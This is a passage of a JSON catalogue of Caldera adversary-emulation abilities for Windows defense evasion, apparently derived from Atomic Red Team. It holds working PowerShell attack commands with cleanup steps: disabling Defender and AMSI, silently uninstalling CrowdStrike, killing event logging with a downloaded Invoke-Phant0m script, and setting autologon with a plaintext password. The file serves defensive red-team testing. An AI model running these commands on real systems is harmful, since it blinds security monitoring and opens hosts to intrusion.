                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "a96a64caf38bca14cef902e999bb6b98",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "a96a64caf38bca14cef902e999bb6b98"
    },
    "T1112__defense-evasion__Modify Registry__d2f6cb279552f1b65a9805d63eed1689": {
        "description": "This task recreates the steps taken by BlackByte ransomware before it worms to other machines via Powershell.  See \"Preparing to Worm\" section: https://redcanary.com/blog/blackbyte-ransomware/\nThe steps are as follows:\n<ol>\n    <li>1. Elevate Local Privilege by disabling UAC Remote Restrictions</li>\n    <li>2. Enable OS to share network connections between different privilege levels</li>\n    <li>3. Enable long path values for file paths, names, and namespaces to ensure encryption of all file names and paths</li>\n</ol>\nThe registry keys and their respective values will be created upon successful execution.\n",
        "tactic": "defense-evasion",
        "technique": {
            "attack_id": "T1112",
            "name": "Modify Registry"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "Remove-ItemProperty \"HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" -Name LocalAccountTokenFilterPolicy -Force -ErrorAction Ignore; Remove-ItemProperty \"HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" -Name EnableLinkedConnections -Force -ErrorAction Ignore; Remove-ItemProperty \"HKLM:\\SYSTEM\\CurrentControlSet\\Control\\FileSystem\" -Name LongPathsEnabled -Force -ErrorAction Ignore",
                    "command": "New-ItemProperty \"HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" -Name LocalAccountTokenFilterPolicy -PropertyType DWord -Value 1 -Force; New-ItemProperty \"HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" -Name EnableLinkedConnections -PropertyType DWord -Value 1 -Force; New-ItemProperty \"HKLM:\\SYSTEM\\CurrentControlSet\\Control\\FileSystem\" -Name LongPathsEnabled -PropertyType DWord -Value 1 -Force",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "d2f6cb279552f1b65a9805d63eed1689",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "d2f6cb279552f1b65a9805d63eed1689"
    },
    "T1218.004__defense-evasion__Signed Binary Proxy Execution: InstallUtil__c0bc49e3838d26569b243ae283082926": {
        "description": "Executes the Uninstall Method. Upon execution, version information will be displayed the .NET framework install utility.\n",
        "tactic": "defense-evasion",
        "technique": {
            "attack_id": "T1218.004",
            "name": "Signed Binary Proxy Execution: InstallUtil"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "$InstallerAssemblyDir = \"$Env:TEMP\\\"; $InstallerAssemblyFileName = \"T1218.004.dll\"; $InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName; Remove-Item -Path $InstallerAssemblyFullPath -ErrorAction Ignore",
                    "command": "if (Test-Path \"eaecbe_InstallUtilTestHarness.ps1\") { ; } else {New-Item -Type Directory (split-path \"eaecbe_InstallUtilTestHarness.ps1\") -ErrorAction ignore | Out-Null; Invoke-WebRequest 'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.004/src/InstallUtilTestHarness.ps1' -OutFile \"eaecbe_InstallUtilTestHarness.ps1\"};  ; . \"eaecbe_InstallUtilTestHarness.ps1\"; $InstallerAssemblyDir = \"$Env:TEMP\\\"; $InstallerAssemblyFileName = \"T1218.004.dll\"; $InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName; $CommandLine = \"/logfile= /logtoconsole=false /installtype=notransaction /action=uninstall `\"$InstallerAssemblyFullPath`\"\"; $ExpectedOutput = 'Constructor_Uninstall_'; $TestArgs = @{;     OutputAssemblyDirectory = $InstallerAssemblyDir;     OutputAssemblyFileName = $InstallerAssemblyFileName;     InvocationMethod = 'Executable';     CommandLine = $CommandLine; }; $ActualOutput = Invoke-BuildAndInvokeInstallUtilAssembly @TestArgs; if ($ActualOutput -ne $ExpectedOutput) {;     throw @\"; InstallUtil Uninstall method execution test failure. Installer assembly execution output did not match the expected output.; Expected: $ExpectedOutput; Actual: $ActualOutput; \"@; }",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": [
                        "eaecbe_InstallUtilTestHarness.ps1"
                    ]
                }
            }
        },
        "id__dependence__fact": [
            "c0bc49e3838d26569b243ae283082926",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "c0bc49e3838d26569b243ae283082926"
    },
    "T1036.003__defense-evasion__Masquerading: Rename System Utilities__4bb550aacec4efb190c72389677b7f4e": {
        "description": "Copies a windows exe, renames it as another windows exe, and launches it to masquerade as second windows exe\n",
        "tactic": "defense-evasion",
        "technique": {
            "attack_id": "T1036.003",
            "name": "Masquerading: Rename System Utilities"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "Remove-Item ($env:TEMP + \"\\svchost.exe\") -Force -ErrorAction Ignore",
                    "command": "copy \"$env:ComSpec\" ($env:TEMP + \"\\svchost.exe\"); $myT1036_003 = (Start-Process -PassThru -FilePath ($env:TEMP + \"\\svchost.exe\")).Id; Stop-Process -ID $myT1036_003",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "4bb550aacec4efb190c72389677b7f4e",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "4bb550aacec4efb190c72389677b7f4e"
    },
    "T1562.001__defense-evasion__Impair Defenses: Disable or Modify Tools__4df316c222125fe7372723c5b3434977": {
        "description": "Lockbit Black - Use Registry Editor to turn on automatic logon\n",
        "tactic": "defense-evasion",
        "technique": {
            "attack_id": "T1562.001",
            "name": "Impair Defenses: Disable or Modify Tools"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "Remove-ItemProperty \"HKLM:\\Software\\Policies\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" -Name AutoAdminLogon -Force -ErrorAction Ignore; Remove-ItemProperty \"HKLM:\\Software\\Policies\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" -Name DefaultUserName -Force -ErrorAction Ignore; Remove-ItemProperty \"HKLM:\\Software\\Policies\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" -Name DefaultDomainName -Force -ErrorAction Ignore; Remove-ItemProperty \"HKLM:\\Software\\Policies\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" -Name DefaultPassword -Force -ErrorAction Ignore",
                    "command": "New-ItemProperty \"HKLM:\\Software\\Policies\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" -Name AutoAdminLogon -PropertyType DWord -Value 1 -Force; New-ItemProperty \"HKLM:\\Software\\Policies\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" -Name DefaultUserName -Value Administrator -Force; New-ItemProperty \"HKLM:\\Software\\Policies\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" -Name DefaultDomainName -Value contoso.com -Force; New-ItemProperty \"HKLM:\\Software\\Policies\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" -Name DefaultPassword  -Value password1 -Force",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "4df316c222125fe7372723c5b3434977",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "4df316c222125fe7372723c5b3434977"
    },
    "T1218.004__defense-evasion__Signed Binary Proxy Execution: InstallUtil__61e9071d7b1f01969893d015526e1099": {
        "description": "Executes the Uninstall Method. Upon execution, version information will be displayed the .NET framework install utility.\n",
        "tactic": "defense-evasion",
        "technique": {
            "attack_id": "T1218.004",
            "name": "Signed Binary Proxy Execution: InstallUtil"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "$InstallerAssemblyDir = \"$Env:TEMP\\\"; $InstallerAssemblyFileName = \"T1218.004.dll\"; $InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName; Remove-Item -Path $InstallerAssemblyFullPath -ErrorAction Ignore",
                    "command": "if (Test-Path \"eaecbe_InstallUtilTestHarness.ps1\") { ; } else {New-Item -Type Directory (split-path \"eaecbe_InstallUtilTestHarness.ps1\") -ErrorAction ignore | Out-Null; Invoke-WebRequest 'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.004/src/InstallUtilTestHarness.ps1' -OutFile \"eaecbe_InstallUtilTestHarness.ps1\"};  ; . \"eaecbe_InstallUtilTestHarness.ps1\"; $InstallerAssemblyDir = \"$Env:TEMP\\\"; $InstallerAssemblyFileName = \"T1218.004.dll\"; $InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName; $CommandLine = \"/logfile= /logtoconsole=false /U `\"$InstallerAssemblyFullPath`\"\"; $ExpectedOutput = 'Constructor_Uninstall_'; $TestArgs = @{;     OutputAssemblyDirectory = $InstallerAssemblyDir;     OutputAssemblyFileName = $InstallerAssemblyFileName;     InvocationMethod = 'Executable';     CommandLine = $CommandLine; }; $ActualOutput = Invoke-BuildAndInvokeInstallUtilAssembly @TestArgs; if ($ActualOutput -ne $ExpectedOutput) {;     throw @\"; InstallUtil Uninstall method execution test failure. Installer assembly execution output did not match the expected output.; Expected: $ExpectedOutput; Actual: $ActualOutput; \"@; }",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": [
                        "eaecbe_InstallUtilTestHarness.ps1"
                    ]
                }
            }
        },
        "id__dependence__fact": [
            "61e9071d7b1f01969893d015526e1099",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "61e9071d7b1f01969893d015526e1099"
    },
    "T1562.002__defense-evasion__Impair Defenses: Disable Windows Event Logging__47ba984c0c40a7c41b4797156c1a5f96": {
        "description": "Kill Windows Event Log Service Threads using Invoke-Phant0m. WARNING you will need to restart PC to return to normal state with Log Service. https://artofpwn.com/phant0m-killing-windows-event-log.html",
        "tactic": "defense-evasion",
        "technique": {
            "attack_id": "T1562.002",
            "name": "Impair Defenses: Disable Windows Event Logging"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "Write-Host \"NEED TO Restart-Computer TO ENSURE LOGGING RETURNS\" -fore red; Remove-Item \"$env:TEMP\\Invoke-Phant0m.ps1\" -ErrorAction Ignore",
                    "command": "Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy RemoteSigned -ErrorAction Ignore; $url = \"https://raw.githubusercontent.com/hlldz/Invoke-Phant0m/f1396c411a867e1b471ef80c5c534466103440e0/Invoke-Phant0m.ps1\"; $output = \"$env:TEMP\\Invoke-Phant0m.ps1\"; $wc = New-Object System.Net.WebClient; $wc.DownloadFile($url, $output); cd $env:TEMP; Import-Module .\\Invoke-Phant0m.ps1; Invoke-Phant0m",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "47ba984c0c40a7c41b4797156c1a5f96",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "47ba984c0c40a7c41b4797156c1a5f96"
    },
    "T1027__defense-evasion__Obfuscated Files or Information__1827aa5862b0a63ce537ed37636933d5": {
        "description": "Upon successful execution, an excel containing VBA Macro containing sensitive data will be sent outside the network using email.\nSensitive data includes about around 20 odd simulated credit card numbers that passes the LUHN check.\n",
        "tactic": "defense-evasion",
        "technique": {
            "attack_id": "T1027",
            "name": "Obfuscated Files or Information"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "Send-MailMessage -From",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "1827aa5862b0a63ce537ed37636933d5",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "1827aa5862b0a63ce537ed37636933d5"
    },
    "T1562.001__defense-evasion__Impair Defenses: Disable or Modify Tools__43e3334362b140924f001b256b229ee5": {
        "description": "Disable Windows Defender from starting after a reboot. Upen execution, if the computer is rebooted the entire Virus and Threat protection window in Settings will be\ngrayed out and have no info.\n",
        "tactic": "defense-evasion",
        "technique": {
            "attack_id": "T1562.001",
            "name": "Impair Defenses: Disable or Modify Tools"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "Set-ItemProperty \"HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\" -Name DisableAntiSpyware -Value 0",
                    "command": "Set-ItemProperty \"HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\" -Name DisableAntiSpyware -Value 1",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "43e3334362b140924f001b256b229ee5",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "43e3334362b140924f001b256b229ee5"
    },
    "T1218.004__defense-evasion__Signed Binary Proxy Execution: InstallUtil__48dc8d6cce12ca22b19fdbc93bd3a9ed": {
        "description": "Executes the InstallHelper class constructor runner instead of executing InstallUtil. Upon execution, no output will be displayed if the test\nexecuted successfuly.\n",
        "tactic": "defense-evasion",
        "technique": {
            "attack_id": "T1218.004",
            "name": "Signed Binary Proxy Execution: InstallUtil"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "$InstallerAssemblyDir = \"$Env:TEMP\\\"; $InstallerAssemblyFileName = \"T1218.004.dll\"; $InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName; Remove-Item -Path $InstallerAssemblyFullPath -ErrorAction Ignore",
                    "command": "if (Test-Path \"eaecbe_InstallUtilTestHarness.ps1\") { ; } else {New-Item -Type Directory (split-path \"eaecbe_InstallUtilTestHarness.ps1\") -ErrorAction ignore | Out-Null; Invoke-WebRequest 'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.004/src/InstallUtilTestHarness.ps1' -OutFile \"eaecbe_InstallUtilTestHarness.ps1\"};  ; . \"eaecbe_InstallUtilTestHarness.ps1\"; $InstallerAssemblyDir = \"$Env:TEMP\\\"; $InstallerAssemblyFileName = \"T1218.004.dll\"; $InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName; $CommandLine = \"/logfile= /logtoconsole=false `\"$InstallerAssemblyFullPath`\"\"; $ExpectedOutput = 'Constructor_'; $TestArgs = @{;     OutputAssemblyDirectory = $InstallerAssemblyDir;     OutputAssemblyFileName = $InstallerAssemblyFileName;     InvocationMethod = 'InstallHelper';     CommandLine = $CommandLine; }; $ActualOutput = Invoke-BuildAndInvokeInstallUtilAssembly @TestArgs -MinimumViableAssembly; if ($ActualOutput -ne $ExpectedOutput) {;     throw @\"; InstallHelper method execution test failure. Installer assembly execution output did not match the expected output.; Expected: $ExpectedOutput; Actual: $ActualOutput; \"@; }",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": [
                        "eaecbe_InstallUtilTestHarness.ps1"
                    ]
                }
            }
        },
        "id__dependence__fact": [
            "48dc8d6cce12ca22b19fdbc93bd3a9ed",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "48dc8d6cce12ca22b19fdbc93bd3a9ed"
    },
    "T1562.001__defense-evasion__Impair Defenses: Disable or Modify Tools__392e12d6a466407e28d1bb51cf0729bb": {
        "description": "With administrative rights, an adversary can remove the AMSI Provider registry key in HKLM\\Software\\Microsoft\\AMSI to disable AMSI inspection.\nThis test removes the Windows Defender provider registry key. Upon execution, no output is displayed.\nOpen Registry Editor and navigate to \"HKLM:\\SOFTWARE\\Microsoft\\AMSI\\Providers\\\" to verify that it is gone.\n",
        "tactic": "defense-evasion",
        "technique": {
            "attack_id": "T1562.001",
            "name": "Impair Defenses: Disable or Modify Tools"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "New-Item -Path \"HKLM:\\SOFTWARE\\Microsoft\\AMSI\\Providers\" -Name \"{2781761E-28E0-4109-99FE-B9D127C57AFE}\" -ErrorAction Ignore | Out-Null",
                    "command": "Remove-Item -Path \"HKLM:\\SOFTWARE\\Microsoft\\AMSI\\Providers\\{2781761E-28E0-4109-99FE-B9D127C57AFE}\" -Recurse",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "392e12d6a466407e28d1bb51cf0729bb",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "392e12d6a466407e28d1bb51cf0729bb"
    },
    "T1562.001__defense-evasion__Impair Defenses: Disable or Modify Tools__2e9acde621e7768a73c1b9a1157c444d": {
        "description": "Uninstall Crowdstrike Falcon. If the WindowsSensor.exe path is not provided as an argument we need to search for it. Since the executable is located in a folder named with a random guid we need to identify it before invoking the uninstaller.\n",
        "tactic": "defense-evasion",
        "technique": {
            "attack_id": "T1562.001",
            "name": "Impair Defenses: Disable or Modify Tools"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "if (Test-Path \"C:\\ProgramData\\Package Cache\\{7489ba93-b668-447f-8401-7e57a6fe538d}\\WindowsSensor.exe\") {. \"C:\\ProgramData\\Package Cache\\{7489ba93-b668-447f-8401-7e57a6fe538d}\\WindowsSensor.exe\" /repair /uninstall /quiet } else { Get-ChildItem -Path \"C:\\ProgramData\\Package Cache\" -Include \"WindowsSensor.exe\" -Recurse | % { $sig=$(Get-AuthenticodeSignature -FilePath $_.FullName); if ($sig.Status -eq \"Valid\" -and $sig.SignerCertificate.DnsNameList -eq \"CrowdStrike, Inc.\") { . \"$_\" /repair /uninstall /quiet; break;}}}",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "2e9acde621e7768a73c1b9a1157c444d",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "2e9acde621e7768a73c1b9a1157c444d"
    },
    "T1562.001__defense-evasion__Impair Defenses: Disable or Modify Tools__c6d6e157f9ff496abfed129dda16fe13": {
        "description": "Using the Disable-AntiPhishRule cmdlet to disable antiphish rules in your office-365 organization.\n",
        "tactic": "defense-evasion",
        "technique": {
            "attack_id": "T1562.001",
            "name": "Impair Defenses: Disable or Modify Tools"
        },
        "platforms": {
            "unknown": {
                "psh": {
                    "cleanup": "if(\"None\" -ne \"\") {; $secure_pwd = (\"None\" + \"\") | ConvertTo-SecureString -AsPlainText -Force; $creds = New-Object System.Management.Automation.PSCredential -ArgumentList \"None\", $secure_pwd; Connect-ExchangeOnline -Credential $creds; $test = Get-AntiPhishRule; Enable-AntiPhishRule -Identity $test.Name -Confirm:$false; Get-AntiPhishRule; }",
                    "command": "$secure_pwd = \"None\" | ConvertTo-SecureString -AsPlainText -Force; $creds = New-Object System.Management.Automation.PSCredential -ArgumentList \"None\", $secure_pwd; Connect-ExchangeOnline -Credential $creds; $test = Get-AntiPhishRule; Disable-AntiPhishRule -Identity $test.Name -Confirm:$false; Get-AntiPhishRule",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "c6d6e157f9ff496abfed129dda16fe13",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "c6d6e157f9ff496abfed129dda16fe13"
    },
    "T1027__defense-evasion__Obfuscated Files or Information__7b6d0accaab6330d701dea8f4d7d96d4": {
        "description": "Upon successful execution, an excel containing VBA Macro containing sensitive data will be sent outside the network using HTTP.\nSensitive data includes about around 20 odd simulated credit card numbers that passes the LUHN check.\n",
        "tactic": "defense-evasion",
        "technique": {
            "attack_id": "T1027",
            "name": "Obfuscated Files or Information"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "Invoke-WebRequest -Uri 127.0.0.1 -Method POST -Body \"9070cd_T1027-cc-macro.xlsm\"",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": [
                        "9070cd_T1027-cc-macro.xlsm"
                    ]
                }
            }
        },
        "id__dependence__fact": [
            "7b6d0accaab6330d701dea8f4d7d96d4",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "7b6d0accaab6330d701dea8f4d7d96d4"
    },
    "T1218__defense-evasion__Signed Binary Proxy Execution__1c4576eb8d4cea58c18e4b087d9c9ac0": {
        "description": "Emulates attack with Microsoft.Workflow.Compiler.exe running a .Net assembly that launches calc.exe\n",
        "tactic": "defense-evasion",
        "technique": {
            "attack_id": "T1218",
            "name": "Signed Binary Proxy Execution"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "1c4576eb8d4cea58c18e4b087d9c9ac0",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "1c4576eb8d4cea58c18e4b087d9c9ac0"
    }
}